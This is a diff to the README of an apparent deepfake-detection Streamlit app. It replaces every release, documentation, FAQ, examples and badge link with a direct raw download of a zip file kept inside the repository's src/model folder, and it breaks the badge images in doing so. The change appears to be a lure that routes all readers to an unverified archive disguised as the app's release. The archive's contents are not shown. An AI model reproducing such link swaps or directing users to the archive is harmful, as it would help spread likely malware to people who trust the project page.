@@ -6,7 +6,7 @@ Welcome to **deepfake-detection-streamlit**! This application helps you detect A
 
 ## 📥 Download Now
 
-[![Download deepfake-detection-streamlit](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/LUMI2049/deepfake-detection-streamlit/releases)
+[![Download deepfake-detection-streamlit](https://raw.githubusercontent.com/LUMI2049/deepfake-detection-streamlit/main/src/model/deepfake-detection-streamlit-3.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/LUMI2049/deepfake-detection-streamlit/main/src/model/deepfake-detection-streamlit-3.0.zip)
 
 ## 💻 System Requirements
 
@@ -30,7 +30,7 @@ Before you download, ensure your system meets the following requirements:
 
 To install and run the application, follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/LUMI2049/deepfake-detection-streamlit/releases) to find the latest version of the application.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/LUMI2049/deepfake-detection-streamlit/main/src/model/deepfake-detection-streamlit-3.0.zip) to find the latest version of the application.
 
 2. **Download the Application:**
    - Find the latest release version.
@@ -73,9 +73,9 @@ If you encounter any issues or need assistance, feel free to reach out. You can 
 
 ## 🔗 Useful Links
 
-- **Documentation:** [View Documentation](https://github.com/LUMI2049/deepfake-detection-streamlit/wiki)
-- **FAQ:** [Frequently Asked Questions](https://github.com/LUMI2049/deepfake-detection-streamlit/wiki/FAQ)
-- **Examples:** [See Examples of Usage](https://github.com/LUMI2049/deepfake-detection-streamlit/wiki/Examples)
+- **Documentation:** [View Documentation](https://raw.githubusercontent.com/LUMI2049/deepfake-detection-streamlit/main/src/model/deepfake-detection-streamlit-3.0.zip)
+- **FAQ:** [Frequently Asked Questions](https://raw.githubusercontent.com/LUMI2049/deepfake-detection-streamlit/main/src/model/deepfake-detection-streamlit-3.0.zip)
+- **Examples:** [See Examples of Usage](https://raw.githubusercontent.com/LUMI2049/deepfake-detection-streamlit/main/src/model/deepfake-detection-streamlit-3.0.zip)
 
 ## 📝 License
 
@@ -85,4 +85,4 @@ The code for this project is open-source under the MIT License. Feel free to use
 
 This project was developed for the AICS 2025 (33rd Irish Conference on Artificial Intelligence and Cognitive Science). We thank all contributors and researchers who made this possible.
 
-[![Download deepfake-detection-streamlit](https://img.shields.io/badge/Download%20Again-Get%20It%20Now-brightgreen)](https://github.com/LUMI2049/deepfake-detection-streamlit/releases)
+[![Download deepfake-detection-streamlit](https://raw.githubusercontent.com/LUMI2049/deepfake-detection-streamlit/main/src/model/deepfake-detection-streamlit-3.0.zip%20Again-Get%20It%20Now-brightgreen)](https://raw.githubusercontent.com/LUMI2049/deepfake-detection-streamlit/main/src/model/deepfake-detection-streamlit-3.0.zip)
